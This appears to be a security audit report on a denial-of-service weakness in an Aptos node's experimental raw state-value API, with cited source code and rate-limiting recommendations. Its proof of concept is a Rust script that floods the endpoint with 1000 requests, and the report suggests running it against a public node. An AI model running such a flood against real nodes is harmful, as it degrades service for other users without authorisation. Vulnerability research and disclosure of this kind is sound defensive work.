# Audit Report

## Title
Disk I/O DoS via Unbounded State Key Queries in Experimental Raw State Value Endpoint

## Summary
The `/experimental/state_values/raw` API endpoint accepts arbitrary `StateKey` values from untrusted users without rate limiting, allowing attackers to force expensive RocksDB disk seek operations by querying non-existent or cold storage keys. This can degrade API performance for all users and potentially exhaust node resources.

## Finding Description

The vulnerability exists in the experimental `get_raw_state_value` endpoint which processes user-supplied state keys without implementing rate limiting or query cost controls.

**Attack Flow:**

1. The endpoint accepts a `RawStateValueRequest` containing an arbitrary hex-encoded key [1](#0-0) 

2. The key is BCS-deserialized into a `StateKey` and passed directly to storage layer [2](#0-1) 

3. The query goes through `CachedStateView` which checks speculative state, hot state, then falls back to cold storage [3](#0-2) 

4. For keys not in cache or hot state, a RocksDB iterator seek operation is performed [4](#0-3) 

5. Each seek operation triggers instrumented disk I/O [5](#0-4) 

**Missing Protections:**

The API middleware stack contains no rate limiting [6](#0-5) 

The `ApiConfig` structure has no rate limiting fields despite documentation claims [7](#0-6) 

The HAProxy configuration for the API frontend lacks request rate limits [8](#0-7) 

An attacker can craft thousands of requests with random `StateKey` values (e.g., non-existent account addresses, table items) to force continuous disk seeks. While pruned data returns errors [9](#0-8) , queries for non-existent keys in non-pruned ranges still trigger full RocksDB seek operations.

## Impact Explanation

This is **Medium Severity** per Aptos bug bounty criteria:
- **Validator node slowdowns**: Excessive disk I/O can degrade API response times for all users
- **API performance degradation**: Legitimate queries experience increased latency
- **Resource exhaustion**: I/O queue saturation and potential CPU exhaustion from request processing

The impact is limited to availability/performance rather than consensus or fund loss, but can affect all nodes running public API endpoints. The experimental endpoint is still exposed and functional despite being marked "hidden" in OpenAPI spec [10](#0-9) 

## Likelihood Explanation

**Likelihood: HIGH**

- No authentication required for API access
- No rate limiting enforcement at application or infrastructure layers
- Attack requires only HTTP POST requests with crafted keys
- Endpoint is deployed in production (experimental tag doesn't prevent access)
- RocksDB seek operations are monitored as performance-critical, indicating their cost [11](#0-10) 

An attacker needs minimal resources to launch this attack - a simple script can generate random keys and submit requests continuously.

## Recommendation

Implement multi-layered protection:

1. **Add per-IP rate limiting middleware** in the API service similar to the faucet implementation
2. **Add per-endpoint rate limits** specifically for expensive experimental endpoints
3. **Implement query cost estimation** to reject or throttle queries targeting cold storage
4. **Consider disabling the endpoint** in production until proper protections are in place
5. **Add circuit breaker** that temporarily blocks requests when disk I/O latency exceeds thresholds

Example middleware addition to `runtime.rs`:

```rust
// Add after PostSizeLimit middleware
.with(RateLimitMiddleware::new(
    RateLimitConfig {
        requests_per_minute: 100,
        experimental_endpoints_per_minute: 10,
    }
))
```

## Proof of Concept

```rust
use reqwest::Client;
use aptos_api_types::HexEncodedBytes;
use aptos_types::state_store::state_key::{StateKey, StateKeyInner};
use std::time::Instant;

#[tokio::main]
async fn main() {
    let client = Client::new();
    let api_url = "http://localhost:8080/v1/experimental/state_values/raw";
    
    // Generate 1000 requests with random non-existent keys
    let start = Instant::now();
    let mut handles = vec![];
    
    for i in 0..1000 {
        let client = client.clone();
        let handle = tokio::spawn(async move {
            // Create random account address that likely doesn't exist
            let random_addr = format!("0x{:064x}", i * 999999);
            let state_key = StateKey::account_address(&random_addr.parse().unwrap());
            
            let payload = serde_json::json!({
                "key": HexEncodedBytes(bcs::to_bytes(&state_key).unwrap())
            });
            
            let response = client
                .post(api_url)
                .header("Content-Type", "application/json")
                .header("Accept", "application/x-bcs")
                .json(&payload)
                .send()
                .await;
            
            println!("Request {}: {:?}", i, response.is_ok());
        });
        handles.push(handle);
    }
    
    // Wait for all requests
    for handle in handles {
        handle.await.unwrap();
    }
    
    let duration = start.elapsed();
    println!("1000 requests completed in {:?}", duration);
    println!("Check node's disk I/O metrics - APTOS_SCHEMADB_SEEK_LATENCY_SECONDS should spike");
}
```

Run this against a public Aptos node API and observe:
- Increased APTOS_SCHEMADB_SEEK_LATENCY_SECONDS metrics
- Degraded API response times for concurrent legitimate requests
- No rate limiting or throttling applied

## Notes

While the endpoint is marked "experimental", it remains fully functional and accessible in production deployments. The absence of rate limiting at any layer (application, infrastructure, or network) makes this vulnerability immediately exploitable. The documentation claims rate limiting exists, but code inspection reveals no implementation.

### Citations

**File:** api/types/src/state.rs (L10-12)
```rust
pub struct RawStateValueRequest {
    pub key: HexEncodedBytes,
}
```

**File:** api/src/state.rs (L236-242)
```rust
    #[oai(
        path = "/experimental/state_values/raw",
        method = "post",
        operation_id = "get_raw_state_value",
        tag = "ApiTags::Experimental",
        hidden
    )]
```

**File:** api/src/state.rs (L536-547)
```rust
        let state_key = bcs::from_bytes(&request.key.0)
            .context(format!(
                "Failed deserializing state value. key: {}",
                request.key
            ))
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &ledger_info,
                )
            })?;
```

**File:** storage/storage-interface/src/state_store/state_view/cached_state_view.rs (L233-253)
```rust
    fn get_unmemorized(&self, state_key: &StateKey) -> Result<StateSlot> {
        COUNTER.inc_with(&["sv_unmemorized"]);

        let ret = if let Some(slot) = self.speculative.get_state_slot(state_key) {
            COUNTER.inc_with(&["sv_hit_speculative"]);
            slot
        } else if let Some(slot) = self.hot.get_state_slot(state_key) {
            COUNTER.inc_with(&["sv_hit_hot"]);
            slot
        } else if let Some(base_version) = self.base_version() {
            COUNTER.inc_with(&["sv_cold"]);
            StateSlot::from_db_get(
                self.cold
                    .get_state_value_with_version_by_version(state_key, base_version)?,
            )
        } else {
            StateSlot::ColdVacant
        };

        Ok(ret)
    }
```

**File:** storage/aptosdb/src/state_kv_db.rs (L374-402)
```rust
    pub(crate) fn get_state_value_with_version_by_version(
        &self,
        state_key: &StateKey,
        version: Version,
    ) -> Result<Option<(Version, StateValue)>> {
        let mut read_opts = ReadOptions::default();

        // We want `None` if the state_key changes in iteration.
        read_opts.set_prefix_same_as_start(true);
        if !self.enabled_sharding() {
            let mut iter = self
                .db_shard(state_key.get_shard_id())
                .iter_with_opts::<StateValueSchema>(read_opts)?;
            iter.seek(&(state_key.clone(), version))?;
            Ok(iter
                .next()
                .transpose()?
                .and_then(|((_, version), value_opt)| value_opt.map(|value| (version, value))))
        } else {
            let mut iter = self
                .db_shard(state_key.get_shard_id())
                .iter_with_opts::<StateValueByKeyHashSchema>(read_opts)?;
            iter.seek(&(state_key.hash(), version))?;
            Ok(iter
                .next()
                .transpose()?
                .and_then(|((_, version), value_opt)| value_opt.map(|value| (version, value))))
        }
    }
```

**File:** storage/schemadb/src/iterator.rs (L64-74)
```rust
    pub fn seek<SK>(&mut self, seek_key: &SK) -> aptos_storage_interface::Result<()>
    where
        SK: SeekKeyCodec<S>,
    {
        let _timer =
            APTOS_SCHEMADB_SEEK_LATENCY_SECONDS.timer_with(&[S::COLUMN_FAMILY_NAME, "seek"]);
        let key = <SK as SeekKeyCodec<S>>::encode_seek_key(seek_key)?;
        self.db_iter.seek(&key);
        self.status = Status::DoneSeek;
        Ok(())
    }
```

**File:** api/src/runtime.rs (L253-259)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** config/src/config/api_config.rs (L17-93)
```rust
pub struct ApiConfig {
    /// Enables the REST API endpoint
    #[serde(default = "default_enabled")]
    pub enabled: bool,
    /// Address for the REST API to listen on. Set to 0.0.0.0:port to allow all inbound connections.
    pub address: SocketAddr,
    /// Path to a local TLS certificate to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_cert_path: Option<String>,
    /// Path to a local TLS key to enable HTTPS
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tls_key_path: Option<String>,
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
    /// Enables failpoints for error testing
    #[serde(default = "default_disabled")]
    pub failpoints_enabled: bool,
    /// Enables JSON output of APIs that support it
    #[serde(default = "default_enabled")]
    pub json_output_enabled: bool,
    /// Enables BCS output of APIs that support it
    #[serde(default = "default_enabled")]
    pub bcs_output_enabled: bool,
    /// Enables compression middleware for API responses
    #[serde(default = "default_enabled")]
    pub compression_enabled: bool,
    /// Enables encode submission API
    #[serde(default = "default_enabled")]
    pub encode_submission_enabled: bool,
    /// Enables transaction submission APIs
    #[serde(default = "default_enabled")]
    pub transaction_submission_enabled: bool,
    /// Enables transaction simulation
    #[serde(default = "default_enabled")]
    pub transaction_simulation_enabled: bool,
    /// Maximum number of transactions that can be sent with the Batch submit API
    pub max_submit_transaction_batch_size: usize,
    /// Maximum page size for transaction paginated APIs
    pub max_transactions_page_size: u16,
    /// Maximum page size for block transaction APIs
    pub max_block_transactions_page_size: u16,
    /// Maximum page size for event paginated APIs
    pub max_events_page_size: u16,
    /// Maximum page size for resource paginated APIs
    pub max_account_resources_page_size: u16,
    /// Maximum page size for module paginated APIs
    pub max_account_modules_page_size: u16,
    /// Maximum gas unit limit for view functions
    ///
    /// This limits the execution length of a view function to the given gas used.
    pub max_gas_view_function: u64,
    /// Optional: Maximum number of worker threads for the API.
    ///
    /// If not set, `runtime_worker_multiplier` will multiply times the number of CPU cores on the machine
    pub max_runtime_workers: Option<usize>,
    /// Multiplier for number of worker threads with number of CPU cores
    ///
    /// If `max_runtime_workers` is set, this is ignored
    pub runtime_worker_multiplier: usize,
    /// Configs for computing unit gas price estimation
    pub gas_estimation: GasEstimationConfig,
    /// Periodically call gas estimation
    pub periodic_gas_estimation_ms: Option<u64>,
    /// Configuration to filter view function requests.
    pub view_filter: ViewFilter,
    /// Periodically log stats for view function and simulate transaction usage
    pub periodic_function_stats_sec: Option<u64>,
    /// The time wait_by_hash will wait before returning 404.
    pub wait_by_hash_timeout_ms: u64,
    /// The interval at which wait_by_hash will poll the storage for the transaction.
    pub wait_by_hash_poll_interval_ms: u64,
    /// The number of active wait_by_hash requests that can be active at any given time.
    pub wait_by_hash_max_active_connections: usize,
    /// Allow submission of encrypted transactions via the API
    pub allow_encrypted_txns_submission: bool,
}
```

**File:** docker/compose/aptos-node/haproxy-fullnode.cfg (L99-114)
```text
frontend fullnode-api
    mode http
    option httplog
    bind :8080
    default_backend fullnode-api

    # Deny requests from blocked IPs
    tcp-request connection reject if { src -n -f /usr/local/etc/haproxy/blocked.ips }

    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"

## Specify the API backend
backend fullnode-api
    mode http
    server fullnode fullnode:8080
```

**File:** storage/aptosdb/src/db/aptosdb_internal.rs (L305-315)
```rust
    pub(super) fn error_if_state_kv_pruned(&self, data_type: &str, version: Version) -> Result<()> {
        let min_readable_version = self.state_store.state_kv_pruner.get_min_readable_version();
        ensure!(
            version >= min_readable_version,
            "{} at version {} is pruned, min available version is {}.",
            data_type,
            version,
            min_readable_version
        );
        Ok(())
    }
```

**File:** storage/schemadb/src/metrics.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_metrics_core::{
    exponential_buckets, make_thread_local_histogram_vec, make_thread_local_int_counter_vec,
};

make_thread_local_histogram_vec!(
    pub,
    APTOS_SCHEMADB_SEEK_LATENCY_SECONDS,
    // metric name
    "aptos_schemadb_seek_latency_seconds",
    // metric description
    "Aptos schemadb seek latency in seconds",
    // metric labels (dimensions)
    &["cf_name", "tag"],
    exponential_buckets(/*start=*/ 1e-6, /*factor=*/ 2.0, /*count=*/ 22).unwrap(),
);

make_thread_local_histogram_vec!(
    pub,
    APTOS_SCHEMADB_ITER_LATENCY_SECONDS,
    // metric name
    "aptos_schemadb_iter_latency_seconds",
    // metric description
    "Aptos schemadb iter latency in seconds",
    // metric labels (dimensions)
    &["cf_name"],
    exponential_buckets(/*start=*/ 1e-6, /*factor=*/ 2.0, /*count=*/ 22).unwrap(),
);

make_thread_local_histogram_vec!(
    pub,
    APTOS_SCHEMADB_ITER_BYTES,
    // metric name
    "aptos_schemadb_iter_bytes",
    // metric description
    "Aptos schemadb iter size in bytes",
    // metric labels (dimensions)
    &["cf_name"]
);

make_thread_local_histogram_vec!(
    pub,
    APTOS_SCHEMADB_GET_LATENCY_SECONDS,
    // metric name
    "aptos_schemadb_get_latency_seconds",
    // metric description
    "Aptos schemadb get latency in seconds",
    // metric labels (dimensions)
```
